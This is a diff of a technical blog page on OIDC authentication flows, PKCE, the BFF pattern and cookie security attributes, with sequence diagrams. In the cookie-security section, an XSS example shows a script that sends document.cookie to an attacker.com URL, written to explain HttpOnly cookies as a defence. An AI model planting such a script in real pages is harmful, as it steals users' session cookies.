@@ -5,10 +5,11 @@ categories:
 - auth
 - frontend
 - web
+- api
 comments: true
 date:
     created: 2025-11-18
-    updated: 2025-11-19
+    updated: 2025-11-20
 ---
 
 # OIDC (OpenID Connect)
@@ -16,6 +17,14 @@ date:
 [OIDC (OpenID Connect)](https://openid.net/connect/) is an **authentication layer** built on top of the OAuth 2.0 protocol (**authorization layer**). It allows Web-based, mobile, and JavaScript clients to verify the identity of end-users based on the authentication performed by an authorization server (aka AS or IdP), as well as to obtain basic profile information about the end-user in an interoperable and REST-like manner. It eliminates storing and managing people's passwords.
 
 <!-- more -->
+
+## References
+
+1. https://curity.io/resources/learn/spa-best-practices/
+2. https://curity.io/resources/learn/oauth-cookie-best-practices/
+3. https://auth0.com/blog/application-session-management-best-practices/
+4. https://fusionauth.io/articles/login-authentication-workflows/spa/oauth-authorization-code-grant-sessions-refresh-tokens-cookies
+5. https://fusionauth.io/articles/authentication/how-sso-works
 
 ## OIDC Flows
 
@@ -30,9 +39,12 @@ Some flows (e.g. Implicit Flow, Password Grant (ROPC), without PKCE) have alread
 
 ### Authorization Code Flow + PKCE (Public Client) for SPA
 
-This flow works for a single audience (the Downstream API). In some cases, the SPA itself may act as the resource server (e.g., when using FastAPI's auto-generated OpenAPI UI), meaning the audience would be the API backend itself rather than a separate downstream service.
+This flow works for a **single audience** (the Downstream API). In some cases, the SPA itself may act as the resource server (e.g., when using FastAPI's auto-generated OpenAPI UI), meaning the audience would be the API backend itself rather than a separate downstream service.
 
-The access token is saved in user's browser's memory (e.g., JavaScript variable, sessionStorage) and is accessible to JavaScript code running in the browser, including potentially malicious scripts injected via XSS vulnerabilities or browser extensions. Therefore, it's crucial to implement robust security measures to protect against XSS attacks when using this flow.
+With **PKCE** (Proof Key for Code Exchange), **Authorization Code Injection attacks** are mitigated: even if an attacker steals a valid authorization code, only the original instance that generated the `code_verifier` (the SPA or BFF) can redeem it for tokens, keeping the overall design significantly more robust. And the SPA can securely perform the Authorization Code Flow without a client secret, which is not suitable for public clients like SPAs.
+
+!!! warning "SPA Auth Code flow + PKCE is secure ONLY IF your browser and underlying OS are secure"
+    Although with PKCE, the SPA (considered as public client) doesn't need to hold the **client secret**, the main risk factor in SPA+PKCE is XSS attacks, as **access tokens are stored in browser memory/sessionStorage**, which are accessible to JavaScript code running in the browser, including potentially malicious scripts injected via XSS vulnerabilities or browser extensions. Therefore, it's crucial to implement robust security measures to protect against XSS attacks when using this flow.
 
 **OIDC Authorization Code Flow with PKCE for SPA:**
 
@@ -181,141 +193,118 @@ sequenceDiagram
     autonumber
 
     actor User as User
-    participant Swagger as Swagger UI<br/>(or any web page with Login)
+    participant WebApp as Web Client (SPA/Swagger)
     participant Browser as Browser
 
-    participant BFF as API Backend (BFF)<br/><br/>https://api<br/>client_id=my_bff
-    participant BFFStore as BFF Session Store<br/><br/>(Redis / DB)
+    participant BFF as API Backend (Stateful BFF)<br/>(Confidential Client)
+    participant BFFStore as BFF Session Store<br/>(Redis/Cache)
 
-    participant IdP as Identity Provider<br/><br/>https://idp
-    participant IdPStore as IdP Session Store
-
-    participant API1 as Downstream API-1<br/><br/>https://api-1
-    participant API2 as Downstream API-2<br/><br/>https://api-2
+    participant IdP as Identity Provider<br/>(OIDC Server)
+    participant API1 as Downstream API-1<br/>(Resource Server)
+    participant API2 as Downstream API-2<br/>(Resource Server)
 
     %% ============================================================
-    %% STEP 0 — LOGIN CLICK (BFF ENTRY POINT)
+    %% STEP 0 — LOGIN INITIATION
     %% ============================================================
-    User ->> Swagger: Click "Authorize"
-    Swagger ->> BFF: GET /login
+    Note over User,IdP: First login
+    User ->> WebApp: Click "Login"
+    WebApp ->> BFF: GET /login
 
-    %% STEP 1 — BFF CREATES STATE + PRE-SESSION
-    Note over BFF: Generate:<br/>state=S555<br/>nonce=N777<br/>pre_session=P222<br/>Store {state, nonce}<br/>state for CSRF protection for OIDC and OAuth2, returned by IdP in url query param<br/>nonce for ID token replay protection only for OIDC. returned by IdP in ID token claim
-    BFF ->> BFFStore: Save pre_session P222
+    %% ============================================================
+    %% STEP 1 — BFF GENERATES STATE & PKCE
+    %% ============================================================
+    Note over BFF: Generate state, nonce, code_verifier<br/>1.**state** (one-time) for CSRF protection for OIDC/OAuth2, computed by client, and returned by IdP in url query param<br/>2. **nonce** (one-time) for ID token replay protection only for OIDC. computed by client, and returned by IdP in ID token claim<br/>3. **code_verifier** (BFF lifetime) for PKCE for code injection prevention. code_challenge=BASE64URL(SHA256(code_verifier))
 
-    %% FRONT-CHANNEL REDIRECT TO IdP
-    BFF ->> Browser: 302 Location: https://idp/authorize?<br/>client_id=my_bff<br/>redirect_uri=https://api/callback<br/>response_type=code<br/>scope=<br/>openid offline_access profile<br/>https://api-1/read https://api-1/write<br/>https://api-2/read https://api-2/write<br/>state=S555<br/>nonce=N777<br/><br/>🚀Notice all the possible scopes for multiple APIs (resources) are requested here<br/>💡Some IdPs allow to use a single refresh token to request access token for different APIs.<br/>for e.g. Auth0's Multi-Resource Refresh Token<br/>https://auth0.com/docs/secure/tokens/refresh-tokens/multi-resource-refresh-token
+    BFF ->> BFFStore: Save pre_session {state, nonce, verifier}
 
-    rect rgb(255,200,200)
-    Note over Browser: FRONT CHANNEL<br/>Query params visible to user agent
+    %% FRONT-CHANNEL REDIRECT: Request ALL potential scopes
+    BFF ->> Browser: 302 Location: https://idp/authorize?<br/>client_id=my_bff&response_type=code<br/>&scope=openid profile offline_access https://api-1/write https://api-2/read<br/>&state=S555&nonce=N777<br/>&code_challenge=PKCE_HASH&code_challenge_method=S256
+
+    Note right of Browser: [Vendor Specific] Requesting all possible downstream API scopes upfront.<br/>Refresh Token enables Access Token minting for all authorized resources.
+
+    rect rgb(255,245,255)
+    Note over Browser: ⚠️FRONT CHANNEL: Query parameters visible to user agent<br/>code_challenge is sent, but it's the asymetric sha265 of code_verifier.<br/>✅But code_verifier is not sent in insecure /authorize browser call.<br/>code_verifier will be sent by BFF in secure /token out of browser.
     end
 
-    Browser ->> IdP: GET /authorize?(client_id, state=S555, ...)
+    Browser ->> IdP: GET /authorize (client_id, state, nonce, scope, code_challenge...)
 
     %% ============================================================
-    %% STEP 2 — IdP CREATES AUTHORIZATION + LOGIN SESSIONS
+    %% STEP 2 & 3 — AUTHENTICATION & CODE RETURN
     %% ============================================================
-    Note over IdP: Create authorization_session A111<br/>for client my_bff, state S555
-    IdP ->> IdPStore: Save authorization_session A111
+    User ->> IdP: Enter Credentials (Consent)
 
-    User ->> IdP: Login (Password or MFA)
-    Note over IdP: Create login_session L888<br/>user_id="alice"
-    IdP ->> IdPStore: Save login_session L888
-    IdP ->> IdPStore: Link A111 → L888
+    IdP ->> Browser: Set-Cookie: idp_session=IDPSESS_ABC
+    Note over IdP: 💡 **Session Note:** Flow relies on the BFF Session<br/>the IdP Session Cookie is ignored.
+
+    IdP ->> Browser: 302 https://api/callback?code=C444&state=S555
+    Browser ->> BFF: GET /callback?code=C444&state=S555
 
     %% ============================================================
-    %% STEP 3 — IdP RETURNS AUTHORIZATION CODE TO BFF (VIA BROWSER)
+    %% STEP 4 & 5 — CODE EXCHANGE (BACK-CHANNEL with Full Payload)
     %% ============================================================
-    Note over IdP: Create authorization_code C444<br/>linked to A111, user="alice"
+    BFFStore ->> BFF: Laod State, Nounce, PKCE code_verifier
+    BFF ->> BFF: Validate State
 
-    %% **IdP sets its own SSO cookie in browser**
-    IdP ->> User: Set-Cookie: idp_session=IDPSESS_ABC<br>Domain=auth.idp.com<br/>HttpOnly<br/>Secure<br/>SameSite=Lax<br/><br/>💡This flow won't use idp_session this time, as refresh token grant will be used at first as long as the BFF session is not expired
+    BFF ->> IdP: 🛑 **Confidential Client Authentication** required<br/>POST /token (Code Exchange)<br/>{grant_type=authorization_code,<br/>code=C444,<br/>client_id=my_bff,<br/>client_secret=SECRET,<br/>code_verifier=VERIFIER}
+    Note over BFF,IdP: client_secret and code_verifier are securely sent to IdP out of browser
+    IdP ->> IdP: Validate PKCE: BASE64URL(SHA256(code_verifier)) == stored code_challenge ?
+    IdP ->> BFF: {<br/>"token_type": "Bearer",<br/>"access_token": "AT_INIT",<br/>"refresh_token": "RT777",<br/>"id_token": "JWT..."<br/>}
 
-    rect rgb(255,200,200)
-    IdP ->> Browser: 302 https://api/callback?<br/>code=C444<br/>state=S555
+    %% ============================================================
+    %% STEP 6 — VALIDATION & SESSION CREATION
+    %% ============================================================
+    BFF ->> BFF: Verify ID Token signature, claims, and ASSERT nonce == N777 ?
+
+    Note over BFF: Create Server-Side Session S333<br/>Store { user_id, refresh_token: RT777 }
+    BFF ->> BFFStore: 🔒 **Stateful BFF (most secure)**<br/>Save Session S333 with access_token and refresh_token
+
+    Note over BFF: 💡If use Stateless BFF (less secure), access_token and refresh_token both will be sent to browser<br/>💡If use hybrid BFF (best trade-off), only access_token is sent to browser, refresh_token is kept in the BFF Redis
+
+    BFF ->> Browser: Set-Cookie: session_id=S333<br/>Domain=api.com HttpOnly Secure SameSite=Lax
+    Note over Browser: 🔒 **Stateful BFF (most secure)**<br/>Browser **NEVER** sees tokens, but just a session id
+
+    Browser ->> WebApp: Redirect to Dashboard
+
+    %% ============================================================
+    %% OPERATIONAL PHASE — CALLING API-1 (Refresh Grant with Full Payload)
+    %% ============================================================
+    Note over User,API1: Post-login: Call API-1
+    Browser ->> BFF: GET /api1/data (Cookie S333)
+    BFF ->> BFFStore: Load Session S333
+
+    alt Access Token for API-1 Missing or Expired
+        Note over BFF: Minting access_token using refresh_token<br/>(Confidential Client Authentication)<br/><br/>1. BFF checks: Do I have a valid refresh_token?<br/>   → Yes: Use refresh_token to get new access_token (silent)<br/>   → No: Redirect to IdP /authorize<br/><br/>2. Browser redirects to /authorize<br/>   Automatically sends idp_session cookie (from previous login)<br/><br/>3. IdP validates session cookie<br/>   → Valid: Return auth code immediately (SSO, no login UI)<br/>   → Invalid: Show interactive login page<br/><br/>4. BFF exchanges auth code for tokens<br/>   Uses client_secret (confidential client)<br/><br/>🚀In this flow, BFF has a valid refresh_token, allowing it to silently obtain new access tokens without user interaction
+
+        BFF ->> IdP: POST /token (Refresh Grant)<br/>{grant_type=refresh_token,<br/>refresh_token=RT777,<br/>client_id=my_bff,<br/>client_secret=SECRET,<br/>resource=https://api-1}
+
+        IdP ->> BFF: { "access_token": "AT_API1", "refresh_token": "RT888" (optional rotation) }
+        BFF ->> BFFStore: Update Session (Save AT_API1, Store RT888 if rotated)
     end
 
-    Browser ->> BFF: GET /callback?<br/>code=C444<br/>state=S555
-
-    %% STEP 4 — BFF VALIDATES STATE
-    Note over BFF: Lookup pre_session P222<br/>Check state=S555 OK
-    BFF ->> BFFStore: Load pre_session P222
+    BFF ->> API1: GET /resource<br/>Authorization: Bearer AT_API1
+    API1 -->> BFF: Data
+    BFF -->> Browser: Data
 
     %% ============================================================
-    %% STEP 5 — BFF EXCHANGES CODE FOR TOKENS (BACK-CHANNEL)
+    %% OPERATIONAL PHASE — CALLING API-2 (Reusing RT for New Resource)
     %% ============================================================
-    Note over BFF: BFF is a confidential client<br/>uses client_secret, no PKCE needed
-    BFF ->> IdP: POST /token<br/>{<br/>"grant_type":"authorization_code",<br/>"client_id":"my_bff",<br/>"client_secret":"SECRET",<br/>"code":"C444",<br/>"redirect_uri":"https://api/callback"<br/>}
+    Note over User,API2: Post-login: Call API-2
 
-    Note over IdP: Resolve C444 → A111 → L888 → user="alice"
-    IdP ->> BFF: {<br/>"id_token": "...",<br/>"access_token": "...",  // default audience<br/>"refresh_token": "R777",<br/>"token_type": "Bearer",<br/>"expires_in": 3600<br/>}
+    Browser ->> BFF: GET /api2/data (Cookie S333)
+    BFF ->> BFFStore: Load Session S333
 
-    %% STEP 6 — BFF CREATES SERVER-SIDE SESSION
-    Note over BFF: Create session_id=S333<br/>Store in shared store:<br/>session:S333 → {<br/>user:"alice",<br/>id_token:"...",<br/>refresh_token:"R777",<br/>tokens:{}<br/>}
-    BFF ->> BFFStore: Save session S333<br/><br/>refresh token contains all the possible audiences, BFF will use it to mint access tokens for multiple APIs later.
+    alt Access Token for API-2 Missing or Expired
+        Note over BFF: Reuse RT to get token for new resource (API-2)
 
-    BFF ->> Browser: Set-Cookie: session_id=S333<br>Domain=bff.company.com<br/>HttpOnly<br/>Secure<br/>SameSite=Lax
+        BFF ->> IdP: POST /token (Refresh Grant)<br/>{grant_type=refresh_token,<br/>refresh_token=RT888,<br/>client_id=my_bff,<br/>client_secret=SECRET,<br/>resource=https://api-2}
 
-    %% STEP 7 — AUTHENTICATED SWAGGER / PORTAL
-    Browser ->> BFF: GET /docs<br/>Cookie: session_id=S333
-    BFF ->> BFFStore: Load session S333
-    BFF ->> Swagger: Render authenticated UI<br/>("Authorized" lock🔓)
-
-    %% ============================================================
-    %% POST-AUTH — SPA/Swagger CALLS API #1 VIA BFF
-    %% ============================================================
-
-    rect rgba(153, 179, 219, 1)
-    Note over Browser,API2: post-login operational sequence, BFF handles access_tokens to API-1 and API-2, browser only sends session cookie<br/><br/>id_token is not used for calling downstream APIs (resource servers)
+        IdP ->> BFF: { "access_token": "AT_API2", "refresh_token": "RT999" (optional rotation) }
+        Note over BFF: Store AT_API2 in Session
     end
 
-    Note over Browser,API1: Call API-1
-
-    Note over Browser,BFF: Browser NEVER sees tokens<br/>Only sends small session_id cookie (Stateful BFF)
-    Browser ->> BFF: GET /api1/data<br/>Cookie: session_id=S333
-
-    %% BFF LOOKUP SESSION + TOKEN FOR API1
-    BFF ->> BFFStore: Load session S333
-    Note over BFF: Load refresh_token R777<br/>Check if access_token for API1 exists and valid
-
-    alt No valid token for API1 yet
-        Note over BFF,IdP: Use refresh_token to mint access_token for API1
-        BFF ->> IdP: POST /token<br/>{<br/>"grant_type":"refresh_token",<br/>"client_id":"my_bff",<br/>"client_secret":"SECRET",<br/>"refresh_token":"R777",<br/>"audience":"https://api-1"<br/>}
-        IdP ->> BFF: {<br/>"access_token":"access_token_api_1",<br/>"expires_in":3600,<br/>"refresh_token":"R888" (optional rotated)<br/>}
-
-        Note over BFF: Store in session:<br/>tokens["https://api-1"].access_token = access_token_api_1<br/>If new refresh_token R888 → update
-        BFF ->> BFFStore: Save session S333
-    end
-
-    %% BFF → API1 WITH ACCESS TOKEN
-    BFF ->> API1: GET /resource<br/>Authorization: Bearer access_token_api_1
-    API1 ->> API1: Validate JWT:<br/>iss, aud="https://api-1", exp, scopes
-    API1 ->> BFF: JSON data
-    BFF ->> Browser: JSON data
-
-    %% ============================================================
-    %% POST-AUTH — SPA/Swagger CALLS API #2 VIA BFF
-    %% ============================================================
-    Note over Browser,API2: Call API-2
-
-    Browser ->> BFF: GET /api2/data<br/>Cookie: session_id=S333
-
-    BFF ->> BFFStore: Load session S333
-    Note over BFF: Load refresh_token<br/>Check if access_token for API2 exists and valid
-
-    alt No valid token for API2 yet
-        Note over BFF,IdP: Use SAME refresh_token to mint<br/>access_token for new audience
-        BFF ->> IdP: POST /token<br/>{<br/>"grant_type":"refresh_token",<br/>"client_id":"my_bff",<br/>"client_secret":"SECRET",<br/>"refresh_token":"Rxxx",<br/>"audience":"https://api-2"<br/>}
-        IdP ->> BFF: {<br/>"access_token":"access_token_api_2",<br/>"expires_in":3600,<br/>"refresh_token":"Ryyy" (optional rotated)<br/>}
-
-        Note over BFF: Store in session:<br/>tokens["https://api-2"].access_token = access_token_api_2<br/>Update refresh_token if rotated
-        BFF ->> BFFStore: Save session S333
-    end
-
-    BFF ->> API2: GET /resource<br/>Authorization: Bearer access_token_api_2
-    API2 ->> API2: Validate JWT:<br/>iss, aud="https://api-2", exp, scopes
-    API2 ->> BFF: JSON data
-    BFF ->> Browser: JSON data
+    BFF ->> API2: GET /resource<br/>Authorization: Bearer AT_API2
+    API2 -->> BFF: Data
+    BFF -->> Browser: Data
 ```
 
 ## FAQ
@@ -365,15 +354,17 @@ Session cookies are simpler for single-application scenarios, while OIDC is bett
 
 - **Cookies**
 
-    are a traditional authentication mechanism where the server creates a session after successful login and sends a session ID to the client as a cookie. The client includes this cookie in subsequent requests to maintain the authenticated state. This approach is **tightly coupled** to the server that created the session and requires **server-side session storage**.
+    Are a traditional authentication mechanism where the server creates a session after successful login and sends a session ID to the client as a cookie. The client includes this cookie in subsequent requests to maintain the authenticated state. This approach is **tightly coupled** to the server that created the **stateful** session and requires **server-side session storage**.
 
 - **OIDC**:
 
-    is a **stateless, distributed-friendly authentication protocol** that uses tokens (ID **token**, access token) instead of server-side sessions. Tokens are **self-contained** (especially JWTs), can be **verified independently** without server state, and enable **single sign-on (SSO)** across multiple applications. OIDC separates the authentication provider (IdP) from the application, allowing **centralized identity management**.
+    Is a **stateless, distributed-friendly authentication protocol** that uses tokens (ID **token**, access token) instead of server-side sessions. Tokens are **self-contained** (especially JWTs), can be **verified independently** without server state, and enable **single sign-on (SSO)** across multiple applications. OIDC separates the authentication provider (IdP) from the application, allowing **centralized identity management**.
 
 - **Session cookies + OIDC**
 
-    also known as **BFF (Backend For Frontend)**, check [OIDC Authorization Code Flow (Confidential Client) with BFF pattern and Session Cookies](#oidc-authorization-code-flow-confidential-client-with-bff-pattern-and-session-cookies) for more info, is a common pattern: OIDC is used for initial authentication and obtaining user identity, then session cookies are used to maintain the authenticated state within the application for **performance** (avoid sending large 2-4KB JWT on every request, but with ~100 byte cookie) and **simplicity** (frontend just needs to include a cookie with its requests, just like in the old days, and doesn't need to manage token refreshing or storage). BFF (Backend For Frontend) pattern often employs this combination. This is widely considered the most secure and robust pattern for modern web applications. BFF handles the complex OIDC token flows and securely translates them into a simple, traditional session cookie for the browser.
+    Also known as **BFF (Backend For Frontend)** (check [OIDC Authorization Code Flow (Confidential Client) with BFF pattern and Session Cookies](#oidc-authorization-code-flow-confidential-client-with-bff-pattern-and-session-cookies) for more info), is a common pattern: OIDC is used for initial authentication and obtaining user identity, then session cookies are used to maintain the authenticated state within the application for **performance** (avoid sending large 2-4KB JWT on every request, but with ~100 byte cookie) and **simplicity** (frontend just needs to include a cookie with its requests, just like in the old days, and doesn't need to manage token refreshing or storage).
+
+    BFF (Backend For Frontend) pattern often employs this combination. This is widely considered the most secure and robust pattern for modern web applications. BFF handles the complex OIDC token flows and securely translates them into a simple, traditional session cookie for the browser.
 
     **Session cookie + OIDC hybrid (BFF pattern) with FastAPI and Azure Entra auth flow:**
 
@@ -419,7 +410,12 @@ When people say *"Cookies are legacy."* they usually mean *"Server-side sessions
 | **Primary Use Case** | Cross-site tracking, ads, retargeting                 | SPA Authentication (JWTs), UI preferences                     | User session management, authentication                                                                               |
 | **Storage Type**     | Third-party cookies<br/><br/>You visit `Shoes.com`, but `Facebook.com` leaves a cookie on your browser to see that you like shoes.                                   | Browser Local Storage (Not a cookie)<br/><br/>Get a token, put it in localStorage,<br/>send it in the Header.                          | First-party cookies, stored in browser's cookie store (in memory if session only, or on disk if persistent cookie)                                                                                                 |
 | **Current Status**   | Blocked by default in Safari/Firefox; dying in Chrome | Discouraged for Auth; vulnerable to XSS (Hackers can read it) | Standard & Secure (when using HttpOnly flag)<br/>👍Privacy: stay on one site<br/>👍Security: browser hides the keys |
-| **Key Trend**        | Replacement by Privacy Sandbox / First-party data     | Moving back to Cookies (BFF Pattern) to hide tokens from JS   | Strengthened security via attributes (HttpOnly, Secure, SameSite)                                                     |
+| **Key Trend**        | Replacement by Privacy Sandbox / First-party data     | Moving back to Cookies (BFF Pattern) to hide tokens from JS   | Strengthened security via attributes (HttpOnly, Secure, SameSite)
+
+!!! Tip "Token-Mediating Backend pattern"
+    While a BFF can act as an API proxy and session manager, it may become a throughput bottleneck. The [Token-Mediating Backend pattern](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps#name-token-mediating-backend) addresses this by letting the client browser call downstream APIs directly with short-lived access tokens minted by BFF. This shifts access tokens into the client, so the security posture is weaker unless hardened with mechanisms such as [DPoP (Demonstrating Proof of Possession)](https://auth0.com/blog/oauth2-security-enhancements/#Demonstrating-Proof-of-Possession--DPoP).
+
+    "The more moving parts in auth, the harder it is to attack. 😂"
 
 !!! note "The 'Pendulum Swing': Cookies -> localStorage -> HttpOnly Cookies"
 
@@ -431,17 +427,19 @@ When people say *"Cookies are legacy."* they usually mean *"Server-side sessions
 
     - **2020s**: We realized Local Storage is dangerous (XSS attacks). Now, the industry is moving back to Cookies ("The Legacy Way"), but using them to hold modern JWTs. And with HttpOnly cookies stored in the browser's cookie store (in memory for session cookies or on disk to browser's SQLite DB for e.g. if persistent cookie with the `Expires` or `Max-Age` attribute), they are not accessible to JavaScript, mitigating XSS risks.
 
-**Securing Cookies in Modern Authentication:**
+#### Securing Cookies in Modern Authentication
 
-The warning's mention of HttpOnly, Secure, and SameSite attributes is key to modern cookie security. Here's how they work together to mitigate risks:
+!!! warning "It's secure ONLY IF your browser, underlying OS, device, the network layer, even the target servers are secure"
 
-- `HttpOnly`: This attribute makes a cookie inaccessible to client-side JavaScript (document.cookie API). This is your primary defense against `XSS` (Cross-Site Scripting) attacks, as it prevents malicious scripts from stealing session cookies.
+`HttpOnly`, `Secure`, and `SameSite` cookie attributes is key to modern cookie security. Here's how they work together to mitigate risks:
+
+- `HttpOnly`: This attribute makes a cookie inaccessible to client-side JavaScript (document.cookie API). This is your primary defense against `XSS` (Cross-Site Scripting) attacks, as it prevents malicious scripts from stealing session cookies. **Attacker cannot read the cookie**.
 
     !!! note "Example: XSS (Cross-Site Scripting) Attack"
 
         1. Attacker injects malicious script into a vulnerable web page.
 
-           ```html title="Example: XSS Cross-Site Scripting Attack"
+            ```html title="Example: XSS Cross-Site Scripting Attack"
             <script>
                 fetch('https://attacker.com/steal?cookie=' + document.cookie)
             </script>
@@ -450,8 +448,8 @@ The warning's mention of HttpOnly, Secure, and SameSite attributes is key to mod
         2. You visit the compromised page.
         3. If cookies are stored in localStorage or non-HttpOnly cookies -> ⚠️stolen⚠️
 
-- `Secure`: This ensures the cookie is only sent over encrypted HTTPS connections. This prevents `man-in-the-middle` attackers from eavesdropping and stealing cookies during transmission.
-- `SameSite`: This attribute helps defeat `CSRF` (Cross-Site Request Forgery) attacks by controlling when cookies are sent with cross-site requests.
+- `Secure`: This ensures the cookie is only sent over encrypted HTTPS connections. This prevents `man-in-the-middle` attackers from eavesdropping and stealing cookies during transmission. **Attacker cannot read the cookie in transit**.
+- `SameSite`: This attribute helps defeat `CSRF` (Cross-Site Request Forgery) attacks by controlling when cookies are sent with cross-site requests. **Attacker cannot use the cookie**.
 
     - `SameSite=Lax` (Recommended default): Cookies are sent on same-site requests and top-level navigations (e.g., clicking a link from an email to your site). This provides a good balance of security and usability.
     - `SameSite=Strict` (Maximum security): Cookies are only sent in a first-party context.
@@ -483,8 +481,8 @@ The warning's mention of HttpOnly, Secure, and SameSite attributes is key to mod
 
         Example:
 
-        - Victim site: `https://bank.com`
-        - Attacker site: `https://evil.com`
+         - Victim site: `https://bank.com`
+         - Attacker site: `https://evil.com`
 
         The browser tries to load:
 
@@ -505,18 +503,18 @@ The warning's mention of HttpOnly, Secure, and SameSite attributes is key to mod
 
         -> 🎉Do NOT send the session cookie🎉
 
-**HttpOnly Cookies + BFF Pattern: The Modern Best Practice**
+#### HttpOnly Cookies + BFF Pattern: The Modern Best Practice
 
 A common and secure modern pattern is to ==use an HttpOnly cookie (the container) to transport a JWT token (Stateless BFF) or a session ID (Stateful BFF)==. In this setup, the authentication server issues a token (like a JWT) but instead of sending it to the JavaScript code, it places it inside an HttpOnly cookie. The browser automatically stores the cookie and sends it with every request to your backend, combining the stateless benefits of tokens with the built-in XSS protection of cookies.
 
-| Feature                        | Stateless BFF                    | Stateful BFF                               |
-| ------------------------------ | -------------------------------- | ------------------------------------------ |
-| **What is inside the Cookie?** | The actual JWT                   | A random Session ID                        |
-| **Where is the JWT?**          | Inside the Cookie (user browser side) | In BFF Memory / Redis |
-| **Cookie Size**                | Large (Can hit 4KB limit)        | Tiny (Just a string ID)                    |
-| **Performance**                | Bigger cookie size and JWT signature verification (~0.1ms/token or less)<br/>but no Redis/DB token lookup       | Tiny cookie size<br/>but with extra Redis/DB lookup (~1ms/lookup for remote Redis)                   |
-| **Complexity**                 | Lower (No database needed)       | Higher (Needs Redis/DB)                    |
-| **Security Verdict**           | ✅ Very Good (secure from common attacks (XSS, CSRF))                    | ✅✅ Best (as you can in addition, control the session lifecycle completely and respond immediately to threats by revoking tokens instantly)                                   |
+| Feature                        | ⚡Stateless BFF                                                   | 🚀Hybrid BFF                                                                                         | 🛡️Stateful BFF                                                                                                    |
+| ------------------------------ | --------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
+| **What is inside the Cookie?** | Both access token and refresh token (HttpOnly)            | Short-lived access token JWT (HttpOnly)                                                            | A random opaque session ID<br/>Or a JWT-like session token issued by BFF (not by IdP)<br>both session id and session token could be saved in local memory or a remote Redis cache for scalability                                                                                               |
+| **Where is the JWT?**          | Inside the cookie (browser)                                     | **Stateless** access token in cookie<br/>**Stateful** refresh token + extra context in BFF store                                 | In BFF store (often Redis)                                                                                              |
+| **Cookie Size**                | Large with access token<br/>(can hit 4 KB limit)                                      | Large with access token<br/>(But trimmed lifetime/claims)                                                           | Tiny (just an cookie session ID)                                                                                                |
+| **Performance**                | Larger cookie + JWT signature verification; no store lookup     | 99% requests are stateless JWT access token checks; occasional store refresh token lookup when minting new access tokens             | Extra Redis/DB lookup each request                                                                               |
+| **Complexity**                 | Low (no BFF store required)                                      | High (almost the same as Stateful BFF)                               | High (requires durable session store)                                                                            |
+| **Security Verdict**           | ✅ Very good (mitigates XSS/CSRF via HttpOnly/SameSite)<br/>❌long-live refresh token is at client side<br/>❌Cannot revoke tokens immediately         | ✅✅ Balanced: long-live refresh token is at BFF side, fast revocation via store, limited exposure window per short-live access token | ✅✅ Best: full server control over sessions and immediate revocation capability                                   |
 
 !!! note "Stateless and Stateful BFF hybrid mode with short revocation time"
     In practice, many BFF implementations use a hybrid approach in high-throughput systems (1000 requests/hour/user): they store a **short-lived** (15 min for example) JWT `access_token` inside an HttpOnly cookie for **stateless** authentication, while also maintaining a server-side session store for additional user context, **long-lived** (expires in 7 days for example) `refresh_token`, or other **stateful** data. This hybrid model combines the benefits of both approaches, providing robust security and flexibility.
